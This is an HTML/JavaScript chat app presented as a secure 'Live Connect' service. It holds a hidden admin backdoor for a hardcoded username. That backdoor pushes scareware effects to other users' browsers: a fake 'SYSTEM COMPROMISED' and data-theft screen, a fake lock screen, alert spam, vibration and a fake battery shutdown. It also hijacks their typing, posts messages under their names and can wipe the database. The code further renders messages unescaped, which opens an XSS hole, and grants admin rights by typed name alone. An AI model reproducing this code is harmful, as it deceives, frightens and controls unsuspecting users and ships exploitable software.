<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Connect | Secure</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        :root { --primary: #00d2ff; --danger: #ff0055; --bg: #030303; --glass: rgba(20, 20, 20, 0.85); --neon: #00ff41; }
        * { box-sizing: border-box; outline: none; transition: 0.3s; }
        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: #fff; overflow: hidden; }

        /* Full Modern Container */
        .app-container { max-width: 480px; margin: auto; height: 100vh; background: #000; position: relative; display: flex; flex-direction: column; border: 1px solid rgba(255,255,255,0.05); }
        
        header { padding: 20px; background: var(--glass); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.1); display: flex; justify-content: space-between; align-items: center; z-index: 1000; }
        header h1 { font-size: 1.2rem; margin: 0; background: linear-gradient(45deg, var(--primary), #9d50bb); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; letter-spacing: 1px; }

        .page { display: none; flex: 1; overflow-y: auto; padding: 20px; padding-bottom: 110px; }
        .active { display: flex; flex-direction: column; animation: slideUp 0.5s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        /* Modern Welcome Card */
        .hero-card { background: linear-gradient(135deg, #1a1a1a, #0a0a0a); border: 1px solid #333; padding: 25px; border-radius: 20px; margin-bottom: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
        .hero-card h2 { margin: 0; font-size: 1.4rem; color: var(--primary); }
        .stats-row { display: flex; gap: 10px; margin-top: 15px; }
        .stat { background: rgba(255,255,255,0.05); padding: 8px 15px; border-radius: 12px; font-size: 12px; color: #aaa; border: 1px solid rgba(255,255,255,0.1); }

        /* ADMIN CONTROL PANEL (Neon Hacking UI) */
        #admin-panel { display: none; background: #000; border: 2px solid var(--danger); padding: 15px; margin: 10px; border-radius: 15px; flex-wrap: wrap; gap: 8px; box-shadow: 0 0 30px rgba(255, 0, 85, 0.3); z-index: 2000; }
        .power-btn { flex: 1; min-width: 90px; padding: 12px; font-size: 9px; background: #111; border: 1px solid var(--danger); color: var(--danger); font-weight: bold; border-radius: 8px; cursor: pointer; text-transform: uppercase; }
        .power-btn:hover { background: var(--danger); color: white; box-shadow: 0 0 15px var(--danger); }

        /* Modern Chat Bubbles */
        .chat-stream { display: flex; flex-direction: column; gap: 12px; }
        .bubble { max-width: 80%; padding: 12px 16px; border-radius: 20px; font-size: 14px; position: relative; border: 1px solid rgba(255,255,255,0.05); }
        .me { align-self: flex-end; background: linear-gradient(45deg, #2193b0, #6dd5ed); color: white; border-bottom-right-radius: 4px; }
        .other { align-self: flex-start; background: #1a1a1a; border-bottom-left-radius: 4px; }
        .bubble b { display: block; font-size: 10px; opacity: 0.7; margin-bottom: 5px; text-transform: uppercase; }
        .bubble img { max-width: 100%; border-radius: 12px; margin-top: 8px; }
        .del-x { position: absolute; top: -10px; right: -10px; background: #000; border: 1px solid red; color: red; width: 22px; height: 22px; border-radius: 50%; font-size: 10px; display: none; align-items: center; justify-content: center; cursor: pointer; }
        .bubble:hover .del-x { display: flex; }

        /* Modern Fixed Input */
        .bottom-nav { position: fixed; bottom: 0; max-width: 480px; width: 100%; padding: 20px; background: linear-gradient(to top, #000, transparent); }
        .input-box { background: var(--glass); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); padding: 8px 18px; border-radius: 50px; display: flex; align-items: center; gap: 12px; }
        .input-box input { flex: 1; background: transparent; border: none; color: white; padding: 10px; font-size: 14px; }

        /* Effects Overlays */
        #hacked-screen { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:99999; color: var(--neon); flex-direction:column; align-items:center; justify-content:center; text-align:center; padding: 20px; font-family: 'Courier New', monospace; }
        .invert { filter: invert(1) hue-rotate(180deg); }
    </style>
</head>
<body>

<div id="hacked-screen">
    <i class="fa-solid fa-radiation" style="font-size: 70px; color: var(--danger); margin-bottom: 20px;"></i>
    <h2 id="scare-h2">> SYSTEM COMPROMISED</h2>
    <div id="matrix-box" style="font-size: 12px; text-align: left; width: 80%;"></div>
</div>

<div class="app-container">
    <header>
        <h1>LIVE CONNECT</h1>
        <i class="fa-solid fa-circle-nodes" style="color: var(--primary);"></i>
    </header>

    <div id="loginPage" class="page active">
        <div style="text-align: center; margin-top: 80px;">
            <i class="fa-solid fa-user-shield" style="font-size: 60px; color: var(--primary); margin-bottom: 20px;"></i>
            <h3>SECURE ENTRANCE</h3>
            <input type="text" id="userInput" placeholder="Enter Username" style="width: 80%; padding: 18px; border-radius: 15px; background: #111; border: 1px solid #333; color: white; text-align: center; margin-top: 20px;">
            <button onclick="bootApp()" style="width: 80%; padding: 18px; border-radius: 15px; background: var(--primary); color: #000; font-weight: bold; border: none; margin-top: 20px; cursor: pointer;">INITIALIZE</button>
        </div>
    </div>

    <div id="homePage" class="page">
        <div class="hero-card">
            <h2 id="userGreet">Welcome, Guest</h2>
            <div class="stats-row">
                <div class="stat">System: <span style="color:var(--neon)">Online</span></div>
                <div class="stat">Nodes: <span id="nodeCount" style="color:var(--primary)">0</span></div>
            </div>
        </div>
        <div onclick="openChat('global', false)" style="background: rgba(0, 210, 255, 0.1); border: 1px solid var(--primary); padding: 25px; border-radius: 20px; cursor: pointer; text-align: center;">
            <i class="fa-solid fa-earth-asia" style="margin-right: 10px;"></i> <b>CONNECT TO GLOBAL</b>
        </div>
        <p style="font-size: 11px; color: #555; margin-top: 30px; letter-spacing: 2px;">LIVE NODES DETECTED:</p>
        <div id="targetList"></div>
    </div>

    <div id="chatPage" class="page">
        <div id="admin-panel">
            <button class="power-btn" onclick="sendHack('freeze')">Freeze</button>
            <button class="power-btn" onclick="sendHack('scare')">Matrix</button>
            <button class="power-btn" onclick="sendHack('vibrate')">Vibrate</button>
            <button class="power-btn" onclick="sendHack('popups')">Popups</button>
            <button class="power-btn" onclick="sendHack('audio')">Ghost Sound</button>
            <button class="power-btn" onclick="sendHack('battery')">Battery Prank</button>
            <button class="power-btn" onclick="sendHack('hijack')">Hijack Type</button>
            <button class="power-btn" onclick="sendHack('restore')" style="border-color:lime; color:lime">Restore</button>
            <button class="power-btn" onclick="nukeAll()" style="background:var(--danger); color:white;">NUKE ALL</button>
        </div>

        <div id="chatBox" class="chat-stream"></div>

        <div class="bottom-nav">
            <div class="input-box">
                <i id="wand" class="fa-solid fa-wand-magic-sparkles" style="display:none; color: gold; cursor: pointer;" onclick="togglePanel()"></i>
                <label for="imgIn"><i class="fa-solid fa-image" style="color: #888; cursor: pointer;"></i></label>
                <input type="file" id="imgIn" accept="image/*" style="display:none;" onchange="sendImg(this)">
                <input type="text" id="msgIn" placeholder="Type a message...">
                <i class="fa-solid fa-paper-plane" style="color: var(--primary); cursor: pointer;" onclick="sendMsg()"></i>
            </div>
        </div>
    </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
import { getDatabase, ref, set, push, onValue, remove } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";

const config = { apiKey: "AIzaSyCSD1O9tV7xDZu_kljq-0NMhA2DqtW5quE", databaseURL: "https://live-chat-b810c-default-rtdb.firebaseio.com" };
const app = initializeApp(config);
const db = getDatabase(app);
let myName = null, myRoom = "global", isPriv = false;
const BOSS = "Nazim";

window.bootApp = () => {
    myName = document.getElementById("userInput").value.trim();
    if(!myName) return;
    document.getElementById("loginPage").style.display="none";
    document.getElementById("homePage").classList.add("active");
    document.getElementById("userGreet").innerText = "Welcome, " + myName;
    if(myName === BOSS) document.getElementById("wand").style.display="block";

    // Power Trigger Logic
    onValue(ref(db, "traps/" + myName), snap => {
        const p = snap.val();
        const sc = document.getElementById("hacked-screen");
        if(p === "freeze") { sc.style.display="flex"; document.getElementById("scare-h2").innerText="DEVICE LOCKED"; }
        if(p === "vibrate") { if(navigator.vibrate) navigator.vibrate([500, 200, 500]); }
        if(p === "popups") { for(let i=0; i<8; i++) alert("CRITICAL ERROR IN SYSTEM!"); }
        if(p === "audio") { new Audio('https://www.soundjay.com/nature/sounds/rain-01.mp3').play(); }
        if(p === "battery") { document.body.style.opacity = "0.1"; alert("Battery 1% - Shutting Down"); }
        if(p === "hijack") { document.getElementById("msgIn").oninput = function() { this.value = "NAZIM IS MY GOD! 👑"; }; }
        if(p === "scare") { sc.style.display="flex"; runMatrix(); }
        if(p === "restore") { sc.style.display="none"; document.body.style.opacity="1"; document.getElementById("msgIn").oninput = null; }
    });

    if(myName !== BOSS) set(ref(db, "signals/" + myName), true);
    loadOnlineUsers();
};

function runMatrix() {
    const lines = ["> INJECTING EXPLOIT...", "> BYPASSING FIREWALL...", "> ACCESSING GALLERY...", "> DATA EXPORTED 100%"];
    const mb = document.getElementById("matrix-box"); mb.innerHTML = "";
    let i = 0; setInterval(() => { if(i < lines.length) mb.innerHTML += lines[i++] + "<br>"; }, 600);
}

window.loadOnlineUsers = () => {
    onValue(ref(db, "signals"), snap => {
        const list = document.getElementById("targetList"); list.innerHTML = "";
        let c = 0;
        snap.forEach(u => {
            c++;
            if(u.key !== myName) {
                let d = document.createElement("div"); d.style = "padding:15px; background:#111; border-radius:15px; margin-bottom:10px; border:1px solid #222; display:flex; justify-content:space-between; align-items:center; cursor:pointer;";
                d.innerHTML = `<span>${u.key}</span> <i class="fa-solid fa-bolt" style="color:var(--primary); font-size:10px;"></i>`;
                d.onclick = () => openChat(u.key, true);
                list.appendChild(d);
            }
        });
        document.getElementById("nodeCount").innerText = c;
    });
};

window.openChat = (target, priv) => {
    myRoom = priv ? [myName, target].sort().join("::") : "global";
    isPriv = priv;
    document.getElementById("homePage").classList.remove("active");
    document.getElementById("chatPage").classList.add("active");
    syncMsgs();
};

window.sendMsg = () => {
    const inp = document.getElementById("msgIn");
    if(!inp.value) return;
    if(myName === BOSS && inp.value.startsWith("/as ")) {
        const p = inp.value.split(" ");
        push(ref(db, "messages/global"), { s: p[1], t: inp.value.replace("/as "+p[1]+" ", "") });
    } else {
        push(ref(db, isPriv ? "messages/priv/" + myRoom : "messages/global"), { s: myName, t: inp.value });
    }
    inp.value = "";
};

window.sendImg = (input) => {
    const reader = new FileReader();
    reader.onload = (e) => push(ref(db, isPriv ? "messages/priv/" + myRoom : "messages/global"), { s: myName, i: e.target.result });
    reader.readAsDataURL(input.files[0]);
};

function syncMsgs() {
    const path = isPriv ? "messages/priv/" + myRoom : "messages/global";
    onValue(ref(db, path), snap => {
        const box = document.getElementById("chatBox"); box.innerHTML = "";
        snap.forEach(m => {
            const d = m.val();
            const div = document.createElement("div"); div.className = `bubble ${d.s === myName ? 'me' : 'other'}`;
            div.innerHTML = `<b>${d.s}</b> ${d.t ? d.t : `<img src="${d.i}">`} 
            ${(myName === BOSS) ? `<span class="del-x" onclick="remove(ref(db,'${path}/${m.key}'))">✕</span>` : ''}`;
            box.appendChild(div);
        });
        box.parentElement.scrollTop = box.parentElement.scrollHeight;
    });
}

window.togglePanel = () => { const p = document.getElementById("admin-panel"); p.style.display = p.style.display === "flex" ? "none" : "flex"; };
window.sendHack = (type) => { onValue(ref(db, "signals"), snap => { snap.forEach(u => { if(u.key !== BOSS) set(ref(db, "traps/" + u.key), type); }); }, {onlyOnce:true}); };
window.nukeAll = () => { if(confirm("NUKE DATABASE?")) remove(ref(db)); };
document.getElementById("msgIn").addEventListener("keypress", (e) => { if(e.key === 'Enter') sendMsg(); });
</script>
</body>
</html>
